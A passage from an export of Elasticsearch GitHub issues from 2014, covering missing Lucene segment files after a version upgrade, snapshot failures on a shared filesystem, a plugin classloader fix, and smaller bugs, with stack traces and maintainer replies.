[2014-08-21 13:44:15,826][WARN ][cluster.action.shard     ] [Ghost Dancer] [maki-log-2014-08-21][3] received shard failed for [maki-log-2014-08-21][3], node[QsfMdS40Qve8PukS4er9oA], [P], s[INITIALIZING], indexUUID [_na_], reason [master [Ghost Dancer][QsfMdS40Qve8PukS4er9oA][gboanea-ThinkPad-W520][inet[/10.200.54.63:9300]] marked shard as initializing, but shard is marked as failed, resend shard failure]
[2014-08-21 13:44:15,841][WARN ][cluster.action.shard     ] [Ghost Dancer] [maki-log-2014-08-21][4] received shard failed for [maki-log-2014-08-21][4], node[QsfMdS40Qve8PukS4er9oA], [P], s[INITIALIZING], indexUUID [_na_], reason [master [Ghost Dancer][QsfMdS40Qve8PukS4er9oA][gboanea-ThinkPad-W520][inet[/10.200.54.63:9300]] marked shard as initializing, but shard is marked as failed, resend shard failure]
[2014-08-21 13:44:15,844][WARN ][indices.cluster          ] [Ghost Dancer] [maki-log-2014-08-21][1] failed to start shard
org.elasticsearch.index.gateway.IndexShardGatewayRecoveryException: [maki-log-2014-08-21][1] failed to fetch index version after copying it over
    at org.elasticsearch.index.gateway.local.LocalIndexShardGateway.recover(LocalIndexShardGateway.java:152)
    at org.elasticsearch.index.gateway.IndexShardGatewayService$1.run(IndexShardGatewayService.java:132)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: org.elasticsearch.index.gateway.IndexShardGatewayRecoveryException: [maki-log-2014-08-21][1] shard allocated for local recovery (post api), should exist, but doesn't, current files: [_17o.nrm, _zv.fdx, write.lock, _zv.fdt, segments.gen, _17o.fdx, _17o.tis, _17o.fdt, _zv.fnm, _17p.cfe, _zv.prx, _zv.frq, _17n.prx, _17n.frq, _17o.tii, _17n.nrm, _17n.tii, _17o.frq, _checksums-1408609865048, _17p.cfs, segments_j, _17o.fnm, _17o.prx, _17n.tis, _17n.fdx, _17n.fdt, _zv.tis, _zv.nrm, _17n.fnm, _zv.tii, _17p.si]
    at org.elasticsearch.index.gateway.local.LocalIndexShardGateway.recover(LocalIndexShardGateway.java:131)
    ... 4 more
Caused by: java.io.FileNotFoundException: No such file [_zv.si]
    at org.elasticsearch.index.store.DistributorDirectory.getDirectory(DistributorDirectory.java:173)
    at org.elasticsearch.index.store.DistributorDirectory.getDirectory(DistributorDirectory.java:144)
    at org.elasticsearch.index.store.DistributorDirectory.openInput(DistributorDirectory.java:130)
    at org.apache.lucene.store.FilterDirectory.openInput(FilterDirectory.java:80)
    at org.elasticsearch.index.store.Store$StoreDirectory.openInput(Store.java:375)
    at org.apache.lucene.codecs.lucene3x.Lucene3xSegmentInfoReader.read(Lucene3xSegmentInfoReader.java:103)
    at org.apache.lucene.index.SegmentInfos.read(SegmentInfos.java:361)
    at org.apache.lucene.index.SegmentInfos$1.doBody(SegmentInfos.java:457)
    at org.apache.lucene.index.SegmentInfos$FindSegmentsFile.run(SegmentInfos.java:907)
    at org.apache.lucene.index.SegmentInfos$FindSegmentsFile.run(SegmentInfos.java:753)
    at org.apache.lucene.index.SegmentInfos.read(SegmentInfos.java:453)
    at org.elasticsearch.common.lucene.Lucene.readSegmentInfos(Lucene.java:98)
    at org.elasticsearch.index.gateway.local.LocalIndexShardGateway.recover(LocalIndexShardGateway.java:122)
    ... 4 more..
```

When we shutdown the cluster a couple minutes after bringing it up, with the new version, we saw this behavior just for the newest index. After about an hour the behavior would be the same for other indexes after a cluster restart.

We found out that the indexes are updated and on shutdown nearly all segment info (*.si) files are deleted (those which have a corresponding marker _upgraded.si). Those si files surviving seemed to be not upgraded (at least they don't have those marker files). And there content is like this or this:

```
?&#65533;l Lucene3xSegmentInfo3.6.21&#65533;
os.version 2.6.39-300.17.2.el6uek.x86_64 osLinuxlucene.version+3.6.2 1423725 - rmuir - 2012-12-18 19:45:40 sourceflushos.archamd64
                                                                                                                                  java.versio1.7.0_51
         java.vendor Oracle Corporation
_175.fdt_175_upgraded.s_175.fdx_175.s_175.fn_175.ti_175.ti_175.nr_175.fr_175.prx%
```

```
1408712122907SegmentInfo 4.9&#65533; timestamp
os.version 3.2.0-67-generic osLinuxlucene.version+4.9.0 1604085 - rmuir - 2014-06-20 06:22:23 sourceflushos.archamd64
                                                                                                                     java.versio1.7.0_65
                                                                                                                                        java.vendor Oracle Corporation_18n.cf_18n.cfs_18n.si&#65533;(&#65533;&#65533;&#65533;&#65533;\%
```

While those updated contain afterwards this kind of information:

```
?&#65533;l Lucene3xSegmentInfo3.6.2&#65533;2&#65533;  
                                        mergeFactor 10
os.version 2.6.39-300.17.2.el6uek.x86_64 osLinuxlucene.version+3.6.2 1423725 - rmuir - 2012-12-18 19:45:40 sourcemergeos.archamd64 mergeMaxNumSegments -1
             java.versio1.7.0_51
                                java.vendorOracle Corporation
_1mx.ti_1mx.fr_1mx.pr_1mx.fd_1mx.nr_1mx.fdt_1mx.si_1mx_upgraded.s_1mx.fn_1mx.tis%  
```

We could force the same behavior triggering an optimize for a given index. By restarting one node at a time and waiting till it fully integrated into the cluster we were able to restore the deleted si files through other nodes (including the _upgraded.si marker files). Afterwards the si files where safe and didn't got deleted.

To me it looks like either ES or Lucene is memorizing to delete the _upgraded.si files on VM shutdown but by accident deletes the actual si files as well.
</description><key id="41042082">7430</key><summary>Internal: Indexes unuseable after upgrade from 0.2 to 1.3 and cluster restart</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">philnate</reporter><labels><label>bug</label></labels><created>2014-08-25T08:27:12Z</created><updated>2015-06-07T19:02:12Z</updated><resolved>2014-09-06T13:24:13Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-25T09:38:40Z" id="53245275">@philnate lemme ask a view questions: 
- did you modify any files on you filesystem?
- do you have multiple datapaths configured?
- did you see any other errors in the logs?
- can you share your node-config?
- did you change anything in the upgrade process?
</comment><comment author="philnate" created="2014-08-25T15:27:44Z" id="53279117">- no
- no
- no, right during startup this warning is logged on and on
- I've reproduced the issue with vanilla ES
- as we were coming from 0.2 we did a shutdown of the cluster, updated the binaries and restarted the cluster, then stopped it and after restart we saw the failure

the script to reproduce the issue (just steps, script is slowly synchronous, but doesn't wait for ES starts...) https://gist.github.com/philnate/cfee1d171022b9eb3b23

Hope this helps
</comment><comment author="philnate" created="2014-08-26T12:47:14Z" id="53414738">Updating from 0.20 to 1.0.3 is working. But trying to migrate to any newer version than 1.0.x is giving me the described error. So this issue seems to be introduced with 1.1.0 being it the newer Lucene version used or ES itself.
</comment><comment author="mikemccand" created="2014-08-26T14:22:05Z" id="53427537">This is a Lucene issue; I managed to make a standalone test exposing it: https://issues.apache.org/jira/browse/LUCENE-5907
</comment><comment author="mikemccand" created="2014-08-26T22:42:21Z" id="53504058">The Lucene issue is fixed, and will be included in Lucene 4.10.
</comment><comment author="philnate" created="2014-08-27T11:25:05Z" id="53556439">@mikemccand thank you for your fast solution. I've patched ES 1.3.2 with the fix and a quick test seemed to be ok. Will do some addtional testing.
</comment><comment author="mikemccand" created="2014-08-27T13:30:49Z" id="53572016">Thanks for testing @philnate 
</comment><comment author="s1monw" created="2014-08-27T14:32:25Z" id="53580902">@philnate thanks so much for verifying!! that is super helpful
</comment><comment author="philnate" created="2014-08-28T07:09:18Z" id="53681029">Seems to be all fine. A colleague did some extended testing and everything was good. @s1monw do you plan to consume lucene 4.10 with some upcoming release of ES 1.3? That would allow us to directly upgrade to the latest and greatest ES, not migrating first to 1.0 and then to 1.3.
</comment><comment author="clintongormley" created="2014-09-06T13:24:13Z" id="54712201">@philnate Lucene 4.10 will be in v1.4, but not in v1.3.x

Fixed by #7584
</comment><comment author="mikemccand" created="2014-09-22T08:26:27Z" id="56343131">Lucene 4.9.1 is released, and I upgraded 1.3.x to it: c998d8d1982cc3376f1d7f06e12d0f7d33552203
</comment><comment author="cywjackson" created="2015-01-07T11:25:46Z" id="69009726">it seems we face this issue when upgrade 1.1.2 to 1.3.6 (6-node cluster, rolling upgrade). Here is a count from 1 of the logs:

```
      1 [_gyqx_2k2.del]
      1 [_hcap_2c4.del]
   7951 [_6mef.si]
   9252 [_24gwg.si]
  11295 [_7yti.si]
```

so most of the error coming from that .si files

we also seems to be hitting issue like `CorruptIndexException[checksum failed"  , "failed to fetch index version after copying it over"` and `[2015-01-07 11:03:59,051 +0000][DEBUG][index.shard.service      ] [usw2a-search5-prod] [abid_v3][106] state: [RECOVERING]-&gt;[CLOSED], reason [recovery failure [IndexShardGatewayRecoveryException[[abid_v3][106] failed to fetch index version after copying it over]; nested: CorruptIndexException[[abid_v3][106] Corrupted index [corrupted_ySuuD05fT8ae37Z0ABqoMA] caused by: CorruptIndexException[checksum failed (hardware problem?) : expected=9j4trc actual=1mqj6pc resource=(org.apache.lucene.store.FSDirectory$FSIndexOutput@2d4333ac)]]; ]]`

There are `corrupted_*` files in many place, feel very similar to #8805 , but i am not sure the exact files to delete in the workaround there `We deleted the checksum and the marker file and ES loaded the shards again automatically.`  it is very possible as @s1monw  said `(btw. they might have been corrupted for a long time already but old ES version didn't check this.` We ran this ES &lt; 0.90.3 and has been upgrading to 1.0.3 and 1.1.2 (and ran into various issues along the way) .

We have &gt; 3000 shards total so its hard to say "which phrase" or "primary/replica"... I am very curious to know exactly what steps are `We solved the issue on our side by deleting the checksums as well as the corrupted file and updating the indices.` 

Currently I am attempting to recovery this by setting `index.shard.check_on_startup: fix` , but not sure if it is the right fix especially with the big warning sign about data loss in the doc :(
</comment><comment author="krispyjala" created="2015-02-20T01:58:43Z" id="75177355">So what do we do when this has already happened?  Is this error recoverable?  Is there a way for us to recreate the missing .si file?  Currently, it is happening to two of my indices, but just for one shard (out of 5).  Even if we can somehow retain data on the other 4 shards would be preferred.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregations: index-out-of-bounds exception when upgrading cardinality agg to hyperloglog</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7429</link><project id="" key="" /><description>Reported on the mailing-list: https://groups.google.com/forum/?utm_medium=email&amp;utm_source=footer#!msg/elasticsearch/Hs9jKg8NLlY/ijSPw2bKL0QJ
</description><key id="41039986">7429</key><summary>Aggregations: index-out-of-bounds exception when upgrading cardinality agg to hyperloglog</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">jpountz</reporter><labels><label>bug</label></labels><created>2014-08-25T07:52:15Z</created><updated>2014-09-03T07:15:22Z</updated><resolved>2014-09-03T07:15:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-25T07:52:23Z" id="53236808">I suspect that this happens because the size of the hash table goes out of sync with its content (could it be a sharing issue due to the page recycling logic?).
</comment><comment author="jpountz" created="2014-08-25T09:49:51Z" id="53246220">After discussing with @costin about the way that elasticsearch-hadoop runs query, it looks like this issue might be related to https://github.com/elasticsearch/elasticsearch/issues/1642
</comment><comment author="hudsonb" created="2014-08-27T15:30:26Z" id="53590044">+1 - I'm having this issue as well.

It appears to work 100% of the time for some of my fields and NOT work 100% of the time for others (with identical mappings except for field name). 

Currently I'm working around it by catching the exception and re-issuing the search without the cardinality aggregation.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: Improve test coverage</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7428</link><project id="" key="" /><description>This pull request improves code coverage by removing dead code and adding tests to features/utility classes that were not sufficiently tested.
</description><key id="41038371">7428</key><summary>Test: Improve test coverage</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-25T07:21:49Z</created><updated>2015-06-07T11:46:37Z</updated><resolved>2014-08-25T10:05:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-25T09:45:48Z" id="53245874">I left one comment otherwise this LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>5 out of 10 shards are failed in snapshot</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7427</link><project id="" key="" /><description>I tried snaptshot api of elasticsearch, its saying "state" : "SUCCESS" but 5 out of 10 shards are done and 5 are failed. Why is that so?

"reason" : "RepositoryMissingException[] missing]" Checked and repository is exists.

Using elasticsearch 1.3.0 on centos 6.3.
</description><key id="41031322">7427</key><summary>5 out of 10 shards are failed in snapshot</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">appasahebs</reporter><labels /><created>2014-08-25T04:22:33Z</created><updated>2014-08-26T04:16:26Z</updated><resolved>2014-08-25T12:01:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-08-25T10:21:49Z" id="53248679">@appasahebs could you provide complete output of the failed command? Do you see any corresponding exceptions on the nodes where primaries for the failed shards where located? If you do, could you provide complete exception stack traces?
</comment><comment author="appasahebs" created="2014-08-25T10:39:09Z" id="53249916">I hv deleted that snapshot. There was only reason like repo is missing. I hv checked log and found out following ....

[2014-08-22 11:42:25,316][INFO ][snapshots                ] [node1] snapshot [ModeSearch:snapshot_22_aug-2014-9-50] is done
[2014-08-22 09:48:54,349][WARN ][snapshots                ] [node2] [[index][3]] [ModeSearch:snapshot_22_aug-2014-9-50] failed to create snapshot
        at org.elasticsearch.index.snapshots.IndexShardSnapshotAndRestoreService.snapshot(IndexShardSnapshotAndRestoreService.java:70)
        at org.elasticsearch.snapshots.SnapshotsService$6.run(SnapshotsService.java:829)

Meanwhile i have started again and its in process ... snapshot_25_aug-2014-01-30

"snapshots" : [ {
    "snapshot" : "snapshot_25_aug-2014-01-30",
    "repository" : "ModeSearch",
    "state" : "STARTED",
    "shards_stats" : {
      "initializing" : 6,
      "started" : 2,
      "finalizing" : 2,
      "done" : 0,
      "failed" : 0,
      "total" : 10
    },
</comment><comment author="imotov" created="2014-08-25T10:43:57Z" id="53250194">@appasahebs do you see any other exceptions on node2 corresponding to the time you registered the repository? Any exceptions or error messages with `failed to create repository` text in them?
</comment><comment author="appasahebs" created="2014-08-25T11:15:43Z" id="53252109">Nope, i hv checked repo on all node by doing GET its there on all.
</comment><comment author="imotov" created="2014-08-25T11:30:33Z" id="53253039">That doesn't mean anything. The actual get repository requests is always performed on master, no matter which node you send your send this request through. What type of repository is it?
</comment><comment author="appasahebs" created="2014-08-25T11:31:14Z" id="53253079">It is type of "fs"
</comment><comment author="appasahebs" created="2014-08-25T11:33:06Z" id="53253216">Just wanna to update you current status on snapshot that i have mentioned earlier. It seems to 2 shards done.

"snapshots" : [ {
    "snapshot" : "snapshot_25_aug-2014-01-30",
    "repository" : "ModeSearch",
    "state" : "STARTED",
    "shards_stats" : {
      "initializing" : 3,
      "started" : 4,
      "finalizing" : 0,
      "done" : 3,
      "failed" : 0,
      "total" : 10
    }
</comment><comment author="imotov" created="2014-08-25T11:35:26Z" id="53253385">Does the path specified in the `location` parameter exist on all data and master nodes, point to the same location in the shared filesystem and accessible by elasticsearch user (the user that you use to run elasticsearch process)? 
</comment><comment author="appasahebs" created="2014-08-25T11:39:22Z" id="53253672">Smart!!!.

That might be the issue. I am using nfs mount but its is only mounted on master node from which i hv started snapshot. Will that required to mount me on all data nodes?.
</comment><comment author="imotov" created="2014-08-25T11:55:19Z" id="53254710">Yes, the path specified in the `location` parameter should point to the same location in the shared filesystem and be accessible on all data and master nodes.
</comment><comment author="appasahebs" created="2014-08-25T12:00:25Z" id="53255089">Ok thanks, i will change and try. Why this snapshot process is going very slow? Any trick to do fast?
</comment><comment author="imotov" created="2014-08-25T12:01:52Z" id="53255225">You can increase snapshot [throttling level](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-snapshots.html#_common_repository_settings). 
</comment><comment author="appasahebs" created="2014-08-25T12:04:00Z" id="53255388">Awesome thanks! and appreciated help.
</comment><comment author="appasahebs" created="2014-08-25T14:49:01Z" id="53273479">All shards has been done. 

Though I couldn't able to see status of all shards done successfully. I could see 9 shards done and when i refresh to check 10th shard status  it has given following exception. (But that river index was not selected during snapshot.)

{
  "error" : "ElasticsearchParseException[failed to parse river [other river name], incompatible params]",
  "status" : 400
}

Mean while i have confirmed shards sizes on disk is equal to shard size showing in head plugin. Should i consider it has been done successfully?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>simple_query_string doc should include NOT flag option</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7426</link><project id="" key="" /><description>NOT operator (-) is probably the most common one you might want to disable... but its missing from the doc list, which is a little confusing. From what I can tell the code works correctly.
</description><key id="41021203">7426</key><summary>simple_query_string doc should include NOT flag option</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rmuir</reporter><labels><label>docs</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-24T22:01:54Z</created><updated>2014-08-25T08:27:29Z</updated><resolved>2014-08-25T08:27:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Encapsulate AggregationBuilder name and make getter public</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7425</link><project id="" key="" /><description>As mentioned in https://groups.google.com/forum/?#!msg/elasticsearch/fe9S2mECMEI/57xZK7i6V7MJ, I'd like the name of an AggregationBuilder to be public. I'm attempting to build a wrapper that will provide some type safety around the type of aggregation in the query and the result and not having access to the name is making the API much clunkier than it would otherwise be.
</description><key id="41020881">7425</key><summary>Encapsulate AggregationBuilder name and make getter public</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">philwills</reporter><labels><label>:Aggregations</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-24T21:43:49Z</created><updated>2015-06-07T12:10:56Z</updated><resolved>2014-08-28T14:35:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-26T08:32:11Z" id="53390320">Hi @philwills, thanks for opening this PR. Maybe there should be a getter (`getName`) for this property instead of making it public? It would also be nice to make sure this method is used at least somewhere, so maybe we should do the following:
- make `name` private in AggregationBuilder
- add a getter for name (`getName()`) in AggregationBuilder
- fix remaining compilation errors by replacing occurrences of `name` from sub-classes with `getName`?

Additionally, could you please sign our [contributor license agreement](http://www.elasticsearch.org/contributor-agreement/)?

Thanks!
</comment><comment author="philwills" created="2014-08-26T11:14:27Z" id="53405270">Thanks for taking a look @jpountz 

Personally, I find getters a bit redundant on a final field, but I'm more than happy to go with the house style. I'll try and put something together this evening. 

I've now signed the CLA.
</comment><comment author="philwills" created="2014-08-26T21:04:59Z" id="53492064">Now updated as per your suggestion.
</comment><comment author="jpountz" created="2014-08-28T14:36:37Z" id="53728742">@philwills Merged, thanks!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Avoid overwriting classloader on plugin initialization</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7424</link><project id="" key="" /><description>This fix is for issue #6931. The plugin initialization code in PluginsService.updatedSettings overrides any custom classloader set in Settings on node initialization. I have changed the call to use an overloaded version that does not reset the classloader variable.

Test suite completed without any errors.
</description><key id="41017467">7424</key><summary>Avoid overwriting classloader on plugin initialization</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">binoyaf</reporter><labels><label>:Plugins</label></labels><created>2014-08-24T19:51:48Z</created><updated>2015-06-04T07:55:25Z</updated><resolved>2015-06-04T07:55:25Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-10-31T10:16:15Z" id="61241246">@dadoonet could you have a look at this please?
</comment><comment author="s1monw" created="2014-11-28T10:16:56Z" id="64877653">@binoyaf how does getting things as a map fix your issue. It seems like you are trying to do some classloader magic here can you explain your issue and what you are trying to do here? are you maybe writing your own settings class?
</comment><comment author="dadoonet" created="2015-01-02T16:46:27Z" id="68540970">No answer given on this. Closing. Feel free to reopen and add more information.
</comment><comment author="binoyaf" created="2015-01-03T07:17:17Z" id="68586214">@s1monw 
Current code:

``` java
public Settings updatedSettings() {
        ImmutableSettings.Builder builder = ImmutableSettings.settingsBuilder().put(this.settings);
        for (Tuple&lt;PluginInfo, Plugin&gt; plugin : plugins) {
            builder.put(plugin.v2().additionalSettings());
        }
        return builder.build();
}
```

Method additionalSettings is defined as-

``` java
return ImmutableSettings.Builder.EMPTY_SETTINGS;
```

When this version of the put method is called, it overwrites any custom classloader that was initially set in the Settings object during node initialization. 

``` java
public Builder put(Settings settings) {
            map.putAll(settings.getAsMap());
            classLoader = settings.getClassLoaderIfSet();
            return this;
}
```

The map version of this method however does not overwrite the classloader, it only appends the plugin settings to the Settings instance used during node initialization.
The map version is defined as follows-

``` java
public Builder put(Map&lt;String, String&gt; settings) {
            map.putAll(settings);
            return this;
}
```

Sorry about the late response, you can find more details on the control flow in the associated issue- 6931.
</comment><comment author="dadoonet" created="2015-01-17T13:41:14Z" id="70367315">I wonder if we should not better fix that in the `ImmutableSettings#put(Settings)` method with something like (not tested):

``` java
public Builder put(Settings settings) {
    removeNonArraysFieldsIfNewSettingsContainsFieldAsArray(settings.getAsMap());
    map.putAll(settings.getAsMap());
    // If classloader is not already set, we set the default one
    // but if a classloader is explicitly added within settings, we use this one
    if (classLoader == null || settings.getClassLoaderIfSet() != null) {
       classLoader = settings.getClassLoader();
    }
    return this;
}
```

WDYT? 
</comment><comment author="dadoonet" created="2015-04-29T13:09:52Z" id="97421049">@binoyaf what do you think about the comment I wrote? Wanna adjust your PR?
</comment><comment author="dadoonet" created="2015-06-04T07:55:25Z" id="108771047">No move on this for months. Closing.
Feel free to reopen if needed.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Circuit breakers should be dynamically updatable</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7423</link><project id="" key="" /><description>According to the docs: http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/index-modules-fielddata.html#circuit-breaker all circuit breakers should be dynamically updatable, but this isn't the case:

```
PUT /_cluster/settings
{
    "transient" : {
        "indices.fielddata.breaker.limit" : "20%" 
    }
}
```

Results in:

```
[WARN ][action.admin.cluster.settings] [Ebon Seeker] ignoring transient setting [indices.fielddata.breaker.limit], not dynamically updateable
```
</description><key id="40983648">7423</key><summary>Circuit breakers should be dynamically updatable</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dakrone/following{/other_user}', u'events_url': u'https://api.github.com/users/dakrone/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dakrone/orgs', u'url': u'https://api.github.com/users/dakrone', u'gists_url': u'https://api.github.com/users/dakrone/gists{/gist_id}', u'html_url': u'https://github.com/dakrone', u'subscriptions_url': u'https://api.github.com/users/dakrone/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/19060?v=4', u'repos_url': u'https://api.github.com/users/dakrone/repos', u'received_events_url': u'https://api.github.com/users/dakrone/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dakrone/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dakrone', u'type': u'User', u'id': 19060, u'followers_url': u'https://api.github.com/users/dakrone/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>bug</label></labels><created>2014-08-23T20:09:04Z</created><updated>2014-08-23T20:44:53Z</updated><resolved>2014-08-23T20:44:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-23T20:44:53Z" id="53165030">Using the new names for these settings works correctly
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>post_filter position in query is significant</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7422</link><project id="" key="" /><description>If the post_filter clause comes before a filter clause, the post_filter doesn't seem to execute.
</description><key id="40983517">7422</key><summary>post_filter position in query is significant</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">MrHash</reporter><labels /><created>2014-08-23T20:03:05Z</created><updated>2014-08-24T13:49:10Z</updated><resolved>2014-08-24T10:14:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-24T10:14:39Z" id="53186849">The top-level `filter` param has been renamed to `post_filter`, but the old name is still supported by now.  If you use both, one will overwrite the other.

You probably want to be using a `filtered` query instead (and a `post_filter` only for filtering that should happen _after_ aggs have ben calculated)
